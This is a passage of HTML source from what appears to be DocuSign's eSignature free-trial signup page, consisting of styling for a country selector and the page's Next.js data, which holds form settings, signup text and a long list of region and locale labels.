                        <option value="en-YE">Yemen</option>
                        <option value="en-ZM">Zambia</option>
                        <option value="en-ZW">Zimbabwe</option>
                      </select>
                      <div class="dxp-select-focus">
                        <style data-emotion="css wgiore">
                          .css-wgiore {
                            z-index: -1;
                            outline: 2px solid transparent;
                            outline-offset: 2px;
                            border-radius: 0.125rem;
                            --tw-ring-offset-shadow: var(--tw-ring-inset) 0
                              0 0 var(--tw-ring-offset-width)
                              var(--tw-ring-offset-color);
                            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
                              calc(2px + var(--tw-ring-offset-width))
                              var(--tw-ring-color);
                            box-shadow: var(--tw-ring-offset-shadow),
                              var(--tw-ring-shadow),
                              var(--tw-shadow, 0 0 #0000);
                            --tw-ring-offset-width: 2px;
                            --tw-ring-opacity: 1;
                            --tw-ring-color: rgba(
                              112,
                              109,
                              136,
                              var(--tw-ring-opacity)
                            );
                            position: absolute;
                            top: 0px;
                            right: 0px;
                            bottom: 0px;
                            left: 0px;
                            opacity: 0;
                            width: 100%;
                          }

                          select:enabled:focus
                            + .dxp-select-focus
                            .css-wgiore {
                            opacity: 1;
                          }
                        </style>
                        <div class="css-wgiore"></div>
                      </div>
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <style data-emotion="css eckwi">
          .css-eckwi {
            padding-left: 1.5rem;
            padding-right: 1.5rem;
          }

          @media (min-width: 1024px) {
            .css-eckwi {
              padding-left: 0px;
              padding-right: 0px;
              padding-top: 2.5rem;
            }
          }
        </style>
      </div>
    </main>
  </div>
</div>

<script id="__NEXT_DATA__" type="application/json" crossorigin="anonymous">
  {
    "props": {
      "pageProps": {
        "page": {
          "seo": {
            "name": "Trial Homepage",
            "title": "Start your free trial - DocuSign eSignature",
            "description": "Try a free 30-day trial",
            "index": true,
            "follow": true
          },
          "social": {
            "name": "Trial Social Metadata",
            "title": "DocuSign Free Trial",
            "image": "//images.ctfassets.net/qzrx2id7enw1/6DRV5prhODcKGYvUQrOz7E/cf08a425575d5f985430c5dd50b5878a/DocuSign_banner_bg_dark.jpg",
            "type": "website",
            "twitter__card": "summary_large_image",
            "description": "Try DocuSign eSignature free for 30 days",
            "twitter__image__alt": "Start your free trial"
          },
          "logoAsset": null,
          "appTitle": "eSignature",
          "content": null,
          "helpLinks": [
            {
              "name": "Trial Account - Help Links",
              "title": "Account",
              "links": []
            },
            {
              "name": "Trial Help - other related Links",
              "title": "More",
              "links": [
                {
                  "name": "Support Center",
                  "url": "https://support.docusign.com/s/"
                }
              ]
            }
          ],
          "trialForm": {
            "privacyUrl": "https://www.docusign.com/company/privacy-policy",
            "trialTermsUrl": "https://www.docusign.com/company/terms-and-conditions/web",
            "preferenceCenterUrl": "https://pref.docusign.com/preference-center/EmailVerification?params=dGVtcGxhdGVpZD1vcHRfZG93bl9jb25maWcmbG9jYWxlaWQ9ZW4%3D",
            "localeCode": "en-US",
            "__showSignupReason": null,
            "accountService": {
              "referrer.code": "TrialOrganic-US-EN",
              "referrer.name": "TrialOrganic-US-EN",
              "client_id": "e385ad7c-e1d6-4853-b553-8970c6ed4d9c",
              "distributor.code": "2016-DocuSign-Web",
              "distributor.plan_id": "c3c2a76a-0755-4ad7-985b-a5b50b6c2a13",
              "redirect_uri": "https://datashipper.docusign.com/api/v1/postactivate/redirect/",
              "region": "NA",
              "signup_redirect_uri": "https://datashipper.docusign.com/api/v1/signup/redirect/",
              "activation.templates.view": "FreeTrialBlurredHomeActivationPageStep3Of3",
              "activation.templates.email": "FreeTrialDefaultActivationEmail",
              "confirmation.templates.view": "FreeTrialDefaultOneTimeCodePageStep2Of3",
              "confirmation.templates.email": "FreeTrialSecurityCodeActivation"
            }
          }
        },
        "_nextI18Next": {
          "initialI18nStore": {
            "en-US": {
              "OrganicTrial": {
                "title": "DocuSign: eSignature Trial",
                "description": "DocuSign eSignature Business Pro, the worlds leading eSignature tool. 30 days free.",
                "subjectToTermsAndConditions": "\u003csup\u003e*\u003c/sup\u003eSubject to applicable \u003cTermsLink\u003eterms and conditions\u003c/TermsLink\u003e",
                "help.ctaLabel": "Help",
                "thankYou.title": "Check your email",
                "thankYou.EmailSentConfirmation": "We sent a confirmation link to: \u003cEmail\u003e{{userEmail}}\u003cEmail\u003e",
                "thankYou.UnknownEmailSentConfirmation": "We sent a confirmation link to your email.",
                "thankYou.checkEmailInstructions": "Check your inbox and follow the instructions to get started.",
                "thankYou.staticProgressLabel": "2/3",
                "updateTrialEmail": "Use a different email address",
                "trialForm.title": "Try DocuSign free for 30 days",
                "trialForm.subtitle": "\u003cstrong\u003eNo credit card required\u003c/strong\u003e",
                "accountInfo.email": "Email",
                "ineligible.title": "Your account is not eligible for a free trial",
                "trailIneligibleReasons": "This could be due to reasons including, but not limited to, the following:\u003cReasons\u003e\u003cReason\u003eYou’ve exceeded the limit on free trials for this account\u003c/Reason\u003e\u003cReason\u003eYour organization's admin does not permit free trials\u003c/Reason\u003e\u003c/Reasons\u003e",
                "goToESignApp": "Continue to eSignature",
                "signature": "Signature",
                "welcomeMsg.title": "Welcome!",
                "welcomeMsg.subtitle": "Let’s get started with your DocuSign eSignature free trial.",
                "emailConfirmation": "Email Confirmation",
                "welcome": "Welcome",
                "welcomeBack.title": "Welcome back!",
                "welcomeBack.subtitle": "You already have an account with us.",
                "welcomeBack.EmailSentConfirmation": "To continue, check the email we sent to: \u003cEmail\u003e{{userEmail}}\u003cEmail\u003e"
              },
              "TrialForm": {
                "accountInfo.ctaLabel": "Get Started",
                "accountInfo.legalAgreement": "By clicking the {{buttonLabel}} button below, you agree to the \u003cTermsLink\u003eTerms \u0026 Conditions\u003c/TermsLink\u003e and \u003cPrivacyLink\u003ePrivacy Policy\u003c/PrivacyLink\u003e.",
                "accountInfo.subtitle": "Try the world’s leading e-signature solution today. \u003cstrong\u003e30 days free\u003c/strong\u003e\u003csup\u003e*\u003c/sup\u003e.",
                "accountInfo.title": "Start your free trial",
                "accountInfo.workEmail": "Email",
                "currentRegion": "Region: {{countryRegionName}}",
                "userInfo.ctaLabel": "Next",
                "userInfo.firstName": "First name",
                "userInfo.lastName": "Last name",
                "userInfo.staticProgressLabel": "1/3",
                "userInfo.subtitle": "Let’s get the basics. Enter your info below.",
                "userInfo.title": "Let’s start!",
                "welcomeMsg.subtitle": "Let’s get started with your DocuSign eSignature free trial.",
                "welcomeMsg.title": "Welcome!",
                "accountInfo.workEmailRequired": "Valid email address required.",
                "userInfo.firstnameRequired": "First name required.",
                "userInfo.lastnameRequired": "Last name required.",
                "userInfo.phone": "Phone number",
                "userInfo.phoneRequired": "Valid phone number required.",
                "subjectToTermsAndConditions": "\u003csup\u003e*\u003c/sup\u003eSubject to applicable \u003cTermsLink\u003eterms and conditions\u003c/TermsLink\u003e",
                "accountInfo.acceptAgreementLabel": "I agree to receive marketing communications from DocuSign and acknowledge that I can opt out at any time by visiting the \u003cPreferenceCenterLink\u003ePreference Center\u003c/PreferenceCenterLink\u003e.",
                "unexpectedError": "Unexpected error occurred.",
                "welcomeBack.title": "Welcome back!",
                "welcomeBack.continueLoginPropmpt": "It looks like you already have an account with us. Please log in to confirm your eligibility for the free trial.",
                "welcomeBack.continueLogin": "Continue to Log In",
                "toast.error": "Something went wrong. Please try again.",
                "accountInfo.signupReasonRequired": "Trial reason required",
                "reasonForTrialSignup": "Reason for trial",
                "signupReason.business": "I'm evaluating it for my business.",
                "signupReason.personal": "I'm evaluating it for my personal use.",
                "signupReason.developer": "I'm a developer building an integration.",
                "signupReason.signer": "I just need to sign a document today.",
                "signature": "Signature",
                "accountInfo.countryRequired": "Country/region is required. ",
                "form.country": "Country/region"
              },
              "LocaleSelector": {
                "region.en.af": "Afghanistan",
                "region.en.ax": "Aland Islands",
                "region.en.al": "Albania",
                "region.en.dz": "Algeria",
                "region.en.as": "American Samoa",
                "region.en.ad": "Andorra",
                "region.en.ao": "Angola",
                "region.en.ai": "Anguilla",
                "region.en.aq": "Antarctica",
                "region.en.ag": "Antigua and Barbuda",
                "region.en.ar": "Argentina",
                "region.en.am": "Armenia",
                "region.en.aw": "Aruba",
                "region.en.au": "Australia",
                "region.de.at": "Austria",
                "region.en.az": "Azerbaijan",
                "region.en.bs": "Bahamas",
                "region.en.bh": "Bahrain",
                "region.en.bd": "Bangladesh",
                "region.en.bb": "Barbados",
                "region.en.bz": "Belizeh",
                "region.en.bj": "Benin",
                "region.en.bm": "Bermuda",
                "region.en.bt": "Bhutan",
                "region.en.bo": "Bolivia",
                "region.en.ba": "Bosnia and Herzegovina",
                "region.en.bw": "Botswana",
                "region.en.bv": "Bouvet Island",
                "region.pt.br": "Brazil",
                "region.en.io": "British Indian Ocean Territory",
                "region.en.vg": "British Virgin Islands",
                "region.en.bn": "Brunei",
                "region.en.bg": "Bulgaria",
                "region.en.bf": "Burkina Faso",
                "region.en.bi": "Burundi",
                "region.en.kh": "Cambodia",
                "region.en.cm": "Cameroon",
                "region.en.ca": "Canada-English",
                "region.fr.ca": "Canada-French",
                "region.en.cv": "Cape Verde",
                "region.en.bq": "Caribbean Netherlands",
                "region.en.ky": "Cayman Islands",
                "region.en.cf": "Central African Republic",
                "region.en.td": "Chad",
                "region.en.cl": "Chile",
                "region.en.cn": "China",
                "region.en.cx": "Christmas Island",
                "region.en.cc": "Cocos (Keeling) Islands",
                "region.en.co": "Colombia",
                "region.en.km": "Comoros",
                "region.en.cg": "Congo (Brazzaville)",
                "region.en.cd": "Congo (Kinshasa)",
                "region.en.ck": "Cook Islands",
                "region.en.cr": "Costa Rica",
                "region.en.hr": "Croatia",
                "region.en.cw": "Curaçao",
                "region.en.cy": "Cyprus",
                "region.en.cz": "Czech Republic",
                "region.en.dk": "Denmark",
                "region.de.de": "Germany",
                "region.en.dj": "Djibouti",
                "region.en.dm": "Dominica",
                "region.en.do": "Dominican Republic",
                "region.en.ec": "Ecuador",
                "region.en.eg": "Egypt",
                "region.en.sv": "El Salvador",
                "region.en.gq": "Equatorial Guinea",
                "region.en.er": "Eritrea",
                "region.es.es": "Spain",
                "region.en.ee": "Estonia",
                "region.en.et": "Ethiopia",
                "region.en.fk": "Falkland Islands",
                "region.en.fo": "Faroe Islands",
                "region.en.fj": "Fiji",
                "region.en.fi": "Finland",
                "region.fr.fr": "France",
                "region.en.gf": "French Guiana",
                "region.en.pf": "French Polynesia",
                "region.en.tf": "French Southern Territories",
                "region.en.ga": "Gabon",
                "region.en.gm": "Gambia",
                "region.en.ge": "Georgia",
                "region.en.gh": "Ghana",
                "region.en.gi": "Gibraltar",
                "region.en.gr": "Greece",
                "region.en.gl": "Greenland",
                "region.en.gd": "Grenada",
                "region.en.gp": "Guadeloupe",
                "region.en.gu": "Guam",
                "region.en.gt": "Guatemala",
                "region.en.gg": "Guernsey",
                "region.en.gn": "Guinea",
                "region.en.gw": "Guinea-Bissau",
                "region.en.gy": "Guyana",
                "region.en.ht": "Haiti",
                "region.en.hm": "Heard Island and McDonald Islands",
                "region.en.hn": "Honduras",
                "region.en.hk": "Hong Kong S.A.R. China",
                "region.zh.hk": "Hong Kong-Traditional Chinese",
                "region.en.hu": "Hungary",
                "region.en.is": "Iceland",
                "region.en.in": "India",
                "region.en.id": "Indonesia",
                "region.en.iq": "Iraq",
                "region.en.ie": "Ireland",
                "region.en.im": "Isle of Man",
                "region.en.il": "Israel",
                "region.it.it": "Italy",
                "region.en.ci": "Ivory Coast",
                "region.en.jm": "Jamaica",
                "region.ja.jp": "Japan",
                "region.en.je": "Jersey",
                "region.en.jo": "Jordan",
                "region.en.kz": "Kazakhstan",
                "region.en.ke": "Kenya",
                "region.en.ki": "Kiribati",
                "region.en.kw": "Kuwait",
                "region.en.kg": "Kyrgyzstan",
                "region.en.la": "Laos",
                "region.en.lv": "Latvia",
                "region.en.lb": "Lebanon",
                "region.en.ls": "Lesotho",
                "region.en.lr": "Liberia",
                "region.en.ly": "Libya",
                "region.en.li": "Liechtenstein",
                "region.en.lt": "Lithuania",
                "region.en.lu": "Luxembourg",
                "region.en.mo": "Macao S.A.R. China",
                "region.en.mk": "Macedonia",
                "region.en.mg": "Madagascar",
                "region.en.mw": "Malawi",
                "region.en.my": "Malaysia",
                "region.en.mv": "Maldives",
                "region.en.ml": "Mali",
                "region.en.mt": "Malta",
                "region.en.mh": "Marshall Islands",
                "region.en.mq": "Martinique",
                "region.en.mr": "Mauritania",
                "region.en.mu": "Mauritius",
                "region.en.yt": "Mayotte",
                "region.es.mx": "Mexico",
                "region.en.fm": "Micronesia",
                "region.en.md": "Moldova",
                "region.en.mc": "Monaco",
                "region.en.mn": "Mongolia",
                "region.en.me": "Montenegro",
                "region.en.ms": "Montserrat",
                "region.en.ma": "Morocco",
                "region.en.mz": "Mozambique",
                "region.en.mm": "Myanmar",
                "region.en.na": "Namibia",
                "region.en.nr": "Nauru",
                "region.nl.nl": "Netherlands",
                "region.en.np": "Nepal",
                "region.en.an": "Netherlands Antilles",
                "region.en.nc": "New Caledonia",
                "region.en.nz": "New Zealand",
                "region.en.ni": "Nicaragua",
                "region.en.ne": "Niger",
                "region.en.ng": "Nigeria",
                "region.en.nu": "Niue",
                "region.en.nf": "Norfolk Island",
                "region.en.mp": "Northern Mariana Islands",
                "region.en.no": "Norway",
                "region.en.om": "Oman",
                "region.en.pk": "Pakistan",
                "region.en.pw": "Palau",
                "region.en.ps": "Palestinian Territory",
                "region.en.pa": "Panama",
                "region.en.pg": "Papua New Guinea",
                "region.en.py": "Paraguay",
                "region.en.pe": "Peru",
                "region.en.ph": "Philippines",
                "region.en.pn": "Pitcairn",
                "region.en.pl": "Poland",
                "region.pt.pt": "Portugal",
                "region.en.pr": "Puerto Rico",
                "region.en.qa": "Qatar",
                "region.en.re": "Reunion",
                "region.en.ro": "Romania",
                "region.en.rw": "Rwanda",
                "region.en.bl": "Saint Barthélemy",
                "region.en.sh": "Saint Helena",
                "region.en.kn": "Saint Kitts and Nevis",
                "region.en.lc": "Saint Lucia",
                "region.en.mf": "Saint Martin (French part)",
                "region.en.pm": "Saint Pierre and Miquelon",
                "region.en.vc": "Saint Vincent and the Grenadines",
                "region.en.ws": "Samoa",
                "region.en.sm": "San Marino",
                "region.en.st": "Sao Tome and Principe",
                "region.en.sa": "Saudi Arabia",
                "region.en.sn": "Senegal",
                "region.en.rs": "Serbia",
                "region.en.sc": "Seychelles",
                "region.en.sl": "Sierra Leone",
                "region.en.sg": "Singapore",
                "region.en.sx": "Sint Maarten",
                "region.en.sk": "Slovakia",
                "region.en.si": "Slovenia",
                "region.en.sb": "Solomon Islands",
                "region.en.so": "Somalia",
                "region.en.za": "South Africa",
                "region.en.gs": "South Georgia and the South Sandwich Islands",
                "region.ko.kr": "South Korea",
                "region.en.ss": "South Sudan",
                "region.en.lk": "Sri Lanka",
                "region.en.sr": "Suriname",
                "region.en.sj": "Svalbard and Jan Mayen",
                "region.en.sz": "Swaziland",
                "region.en.se": "Sweden",
                "region.de.ch": "Switzerland-German",
                "region.en.tw": "Taiwan",
                "region.en.tj": "Tajikistan",
                "region.en.tz": "Tanzania",
                "region.en.th": "Thailand",
                "region.en.tl": "Timor-Leste",
                "region.en.tg": "Togo",
                "region.en.tk": "Tokelau",
                "region.en.to": "Tonga",
                "region.en.tt": "Trinidad and Tobago",
                "region.en.tn": "Tunisia",
                "region.en.tr": "Turkey",
                "region.en.tm": "Turkmenistan",
                "region.en.tc": "Turks and Caicos Islands",
                "region.en.tv": "Tuvalu",
                "region.en.vi": "U.S. Virgin Islands",
                "region.en.ug": "Uganda",
                "region.en.ua": "Ukraine",
                "region.en.gb": "United Kingdom",
                "region.en.us": "United States",
                "region.en.um": "United States Minor Outlying Islands",
                "region.en.uy": "Uruguay",
                "region.en.uz": "Uzbekistan",
                "region.en.vu": "Vanuatu",
                "region.en.va": "Vatican",
                "region.en.vn": "Vietnam",
                "region.en.wf": "Wallis and Futuna",
                "region.en.eh": "Western Sahara",
                "region.en.ye": "Yemen",
                "region.en.zm": "Zambia",
                "region.en.zw": "Zimbabwe",
                "region.en.be": "Belgium",
                "region.en.pt": "Portugal",
                "region.ar.ae": "United Arab Emirate",
                "region.en.hk.2": "Hong Kong-English",
                "region.fr.ch": "Switzerland-French",
                "region.en.ch": "Switzerland",
                "region.en.ae": "United Arab Emirate",
                "region.en.at": "Austria",
                "region.fr.be": "Belgium-French",
                "region.nl.be": "Belgium",
                "region.fi.fi": "Finland",
                "region.de.lu": "Luxemburg",
                "region.fr.lu": "Luxemburg-French",
                "country.ca": "Canada"
              }
            }
          },
          "initialLocale": "en-US",
          "userConfig": null
        }
      },
      "__N_SSG": true
    },
    "page": "/",
    "query": {},
    "buildId": "NmCvAuSPMtwBPlTbckofC",
    "isFallback": false,
    "dynamicIds": [74971],
    "gsp": true,
    "locale": "en-US",
    "locales": [
      "en-US",
      "de-AT",
      "de-CH",
      "de-DE",
      "de-LU",
      "en-AT",
      "en-AU",
      "en-BE",
      "en-BR",
      "en-CA",
      "en-CH",
      "en-CL",
      "en-CO",
      "en-DE",
      "en-DK",
      "en-ES",
      "en-FI",
      "en-FR",
      "en-GB",
      "en-HK",
      "en-IE",
      "en-IL",
      "en-IN",
      "en-IS",
      "en-IT",
      "en-KR",
      "en-LU",
      "en-MX",
      "en-MY",
      "en-NL",
      "en-NO",
      "en-NZ",
      "en-PH",
      "en-SE",
      "en-SG",
      "en-TW",
      "en-ZA",
      "es-CL",
      "es-CO",
      "es-ES",
      "es-MX",
      "es-US",
      "fr-BE",
      "fr-CA",
      "fr-CH",
      "fr-FR",
      "fr-LU",
      "it-IT",
      "ja-JP",
      "nl-BE",
      "nl-NL",
      "pt-BR",
      "pt-PT"
    ],
    "defaultLocale": "en-US",
    "scriptLoader": []
  }
</script>
</div>
`
